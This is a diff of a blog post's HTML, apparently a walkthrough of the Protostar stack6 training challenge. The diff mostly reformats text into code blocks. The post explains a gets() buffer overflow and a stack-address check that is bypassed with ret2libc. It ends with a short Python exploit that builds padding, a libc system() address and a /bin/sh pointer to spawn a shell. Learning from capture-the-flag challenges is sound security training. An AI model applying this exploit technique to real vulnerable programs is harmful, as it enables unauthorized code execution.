@@ -103,7 +103,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "1005"
+    "wordCount": "1009"
   }]
   </script>
 
@@ -399,28 +399,21 @@
 <span class="p">}</span>
 </code></pre></div><p>As of previous challenges, our goal is get code execution on the target host which has the compiled binary of this source code. Some of the key things to understand here are:</p>
 <ul>
-<li>
-<p><code>gets(buffer) :</code> The program will ask as for an input and store it an <code>buffer of size 64 bytes.</code> Gets is a vulnerable function in C that causes stack overflows</p>
-</li>
-<li>
-<p><code>ret</code> : __builtin_return_address(0) - This function checks the current return address on the stack and sets it to a variable ret</p>
-</li>
-<li>
-<p><code>if((ret &amp;amp; 0xbf000000) == 0xbf000000) :</code> This check performs a <code>bitwise AND</code> operation with the <code>current address on the stack</code> with the hex value <code>0xbf000000</code> and then compares it with 0xbf000000. Essentially what this means is that, it checks if the first byte in the return address is equal to 0xbf, since the remaining bytes will be converted to 0 in the AND operation.````Suppose our return address points to<code> 0xbfffff01, the check is performed as follows</code><br>
-Operation<code>|   </code>HEX<code>   |   </code>Binary```<br>
-<strong><strong><strong><strong><strong>|<em><strong><strong><strong><strong><strong>|</strong></strong></strong></strong></strong></em></strong></strong></strong></strong></strong>_____________________</p>
-<pre><code>   0xbfffff01 = 10111111 11111111 11111111 00000001  
-</code></pre>
-<p><code>AND</code>  0xbf000000 = 10111111 00000000 00000000 00000000</p>
-</li>
+<li><code>gets(buffer) :</code> The program will ask as for an input and store it an <code>buffer of size 64 bytes.</code> Gets is a vulnerable function in C that causes stack overflows</li>
+<li><code>ret</code> : __builtin_return_address(0) - This function checks the current return address on the stack and sets it to a variable ret</li>
+<li><code>if((ret &amp;amp; 0xbf000000) == 0xbf000000) :</code> This check performs a <code>bitwise AND</code> operation with the <code>current address on the stack</code> with the hex value <code>0xbf000000</code> and then compares it with 0xbf000000. Essentially what this means is that, it checks if the first byte in the return address is equal to 0xbf, since the remaining bytes will be converted to 0 in the AND operation.</li>
 </ul>
-<hr>
-<p>The AND operation gives 0xbf000000. So any address beginning with 0xbf will cause the condition to return to true and exit the program`</p>
-<ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Suppose our <span class="k">return</span> address points to 0xbfffff01, the check is performed as follows
+
+     <span class="nv">0xbfffff01</span> <span class="o">=</span> <span class="m">10111111</span> <span class="m">11111111</span> <span class="m">11111111</span> <span class="m">00000001</span>  
+AND  <span class="nv">0xbf000000</span> <span class="o">=</span> <span class="m">10111111</span> <span class="m">00000000</span> <span class="m">00000000</span> <span class="m">00000000</span>  
+            
+The AND operation gives 0xbf000000. So any address beginning with 0xbf will cause the condition to <span class="k">return</span> to <span class="nb">true</span> and <span class="nb">exit</span> the program<span class="sb">`</span>
+</code></pre></div><ul>
 <li><code>_exit(0) :</code> A system call to exit the function if the operation above gives us an address beginning with 0xbf</li>
 </ul>
 <h3 id="logic-behind-the-non-executable-stack-protection" class="relative group">Logic behind the non-executable stack protection <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#logic-behind-the-non-executable-stack-protection" aria-label="Anchor">#</a></span></h3>
-<p>In classic buffer overflows, our goal is usually to overwrite the instruction pointer / the return address with the address at the top of the stack where we put our shell code and get code execution.</p>
+<p>In classic buffer overflows, our goal is usually to overwrite the instruction pointer or the return address of a function with the address at the top of the stack where we put our shell code and get code execution.</p>
 <p>But in this case, if we were to overwrite the return address with an address on the stack , the operation fails and the program exits. Let us see why using gdb</p>
 <p>
 
@@ -532,9 +525,18 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 <li>Now the next address on the stack will be pointing to the string <code>‘/bin/sh’ </code>which system executes as <code>system(‘/bin/sh’)</code> and gives a shell</li>
 </ul>
 <h3 id="putting-together-a-python-exploit-script" class="relative group">Putting together a python exploit script <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#putting-together-a-python-exploit-script" aria-label="Anchor">#</a></span></h3>
-<p>You could use pwntools for this but I will keep the walkthrough simple.
-<code>import struct``## EIP OFFSET   payload = &amp;#34;A&amp;#34;*80``## libc SYSTEM SYSCALL   system = struct.pack(&amp;#34;I&amp;#34;,0xb7ecffb0)``## Ret address after system   ret = &amp;#34;\x90&amp;#34; * 4``## libc /bin/sh   shell = struct.pack(&amp;#34;I&amp;#34;,0xb7e97000+0x11f3bf)``print (payload + system+ret+shell)</code></p>
-<p>We run the exploit and concatenate with the <code>cat</code> command to open an stdin stream so we have access to the shell we get</p>
+<p>You could use pwntools for this but I will keep the walkthrough simple.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">struct</span>
+<span class="c1">## EIP OFFSET</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">80</span>
+<span class="c1">## libc SYSTEM SYSCALL</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;I&#34;</span><span class="p">,</span><span class="mh">0xb7ecffb0</span><span class="p">)</span>
+<span class="c1">## Ret address after system</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">4</span>
+<span class="c1">## libc /bin/sh</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;I&#34;</span><span class="p">,</span><span class="mh">0xb7e97000</span><span class="o">+</span><span class="mh">0x11f3bf</span><span class="p">)</span>
+<span class="nb">print</span> <span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">system</span><span class="o">+</span><span class="n">ret</span><span class="o">+</span><span class="n">shell</span><span class="p">)</span>
+</code></pre></div><p>We run the exploit and concatenate with the <code>cat</code> command to open an stdin stream so we have access to the shell we get</p>
 <p>
 
 
@@ -551,20 +553,6 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 </p>
 <p>If this walkthrough is not enough, I recommend using other resources to understand the concept of ret2libc as it may not be easy to grasp on the first try.</p>
 <p>Happy hacking :)</p>
-<p>
-
-
-
-  
-  
-  
-    <figure>
-      <img class="my-0 rounded-md" src="/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/7.jpeg#layoutTextWidth" alt="image" />
-      
-    </figure>
-  
-
-</p>
 
       </div>
     </section>
